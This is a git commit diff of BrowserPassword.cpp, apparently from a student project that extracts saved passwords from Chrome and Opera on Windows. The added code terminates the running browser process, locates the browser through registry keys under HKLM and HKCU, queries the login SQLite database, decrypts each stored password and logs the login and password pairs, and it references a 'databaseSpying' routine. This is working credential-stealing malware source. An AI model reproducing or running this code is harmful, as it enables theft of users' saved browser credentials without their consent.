a570755f3c9d8343d5df9cda305ddb0bf9cd5ac4
Valentin Nasraty <valentin.nasraty@epitech.eu>
2018-11-18 10:28:08 +0100

    Update BrowserPassword.cpp

--- src/BrowserPassword.cpp
+++ src/BrowserPassword.cpp
@@ -1,7 +1,8 @@
 
 #include "BrowserPassword.hh"
 
-BrowserPassword::BrowserPassword()
+BrowserPassword::BrowserPassword() : _hKey { HKEY_LOCAL_MACHINE, 
+											 HKEY_CURRENT_USER }
 {
 	_ready = false;
 }
@@ -23,6 +24,11 @@ void BrowserPassword::setBrowserType(const BrowserType &type)
 
 void BrowserPassword::initChromeBrowser()
 {
+	Log::logSomething("\n\\ Chrome initialization /");
+	if (killProcess(C_PROCESS))
+		Log::logSomething("[info] Chrome process killed");
+	else
+		Log::logSomething("[info] Chrome process not found");
 	_dbFilePath = C_DBFILE;
 	_regKeyPath = C_REGKEY;
 	_folder = CSIDL_LOCAL_APPDATA;
@@ -31,21 +37,53 @@ void BrowserPassword::initChromeBrowser()
 
 void BrowserPassword::initOperaBrowser()
 {
+	Log::logSomething("\n\\ Opera initialization /");
+	if (killProcess(O_PROCESS))
+		Log::logSomething("[info] Opera process killed");
+	else
+		Log::logSomething("[info] Opera process not found");
 	_dbFilePath = O_DBFILE;
 	_regKeyPath = O_REGKEY;
 	_folder = CSIDL_APPDATA;
 	_ready = true;
 }
 
+bool BrowserPassword::killProcess(const wchar_t *process)
+{
+	HANDLE hProcess;
+	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
+	PROCESSENTRY32 ProcessEntry = { 0 };
+
+	ProcessEntry.dwSize = sizeof(ProcessEntry);
+	Process32First(hProcessSnapShot, &ProcessEntry);
+	while (Process32Next(hProcessSnapShot, &ProcessEntry))
+	{
+		if (_tcsicmp(ProcessEntry.szExeFile, process) == 0)
+		{
+			hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
+			TerminateProcess(hProcess, 0); // kill browser process before launching analyse
+			CloseHandle(hProcess);
+			CloseHandle(hProcessSnapShot);
+			return (true);
+		}
+
+	}
+	CloseHandle(hProcessSnapShot);
+	return (false);
+}
+
 bool BrowserPassword::isBrowserInstalled() 
 { 
+	short i = 0;
 	HKEY hkey = NULL;
 
-	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, _regKeyPath, 0, KEY_READ, &hkey) != ERROR_SUCCESS)
-	{ 
-		Log::logSomething("[KO] Browser is not installed"); 
+	while (RegOpenKeyExA(_hKey[i], _regKeyPath, 0, KEY_READ, &hkey) != ERROR_SUCCESS && i < _hKey.size())
+		i++;
+	if (i == _hKey.size())
+	{
+		Log::logSomething("[KO] Browser is not installed");
 		return (false);
-    }
+	}
 	Log::logSomething("[OK] Browser is installed");
 	RegCloseKey(hkey); // close the key with handle pointer
 	return (true);
@@ -66,16 +104,22 @@ bool BrowserPassword::findAppdataPath(std::string &appdataPath)
 }
 
 void BrowserPassword::findPasswordTable(sqlite3 *db)
-{ 
+{
+	int i = 0;
 	sqlite3_stmt *stmt;
 
 	Log::logSomething("[OK] Database open");
 	if (sqlite3_prepare_v2(db, QUERY, -1, &stmt, 0) == SQLITE_OK) 
 	{
 		Log::logSomething("[OK] Query successfully compiled");
-		while (sqlite3_step(stmt) == SQLITE_ROW)  
-			printPassword(stmt); /* decrypt and display infos */  
-	} 
+		while (sqlite3_step(stmt) == SQLITE_ROW)
+		{
+			printPassword(stmt); /* decrypt and display infos */
+			i++;
+		}
+		if (i == 0)
+			Log::logSomething("\n[info] Password not found");
+	}
 	else 
 		Log::logSomething("[KO] Error compiling query");
 	sqlite3_finalize(stmt); // finalize the compiled query
@@ -103,7 +147,7 @@ void BrowserPassword::printPassword(sqlite3_stmt *stmt)
 						std::string("\nLogin:\t" + std::string((const char *)sqlite3_column_text(stmt, 1))) +
 						std::string("\nPassword:\t" + std::string(uncryptData((BYTE *)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2))));
 
-	Log::logSomething(infos + '\n');
+	Log::logSomething(infos);
 }
 
 void BrowserPassword::databaseSpying()
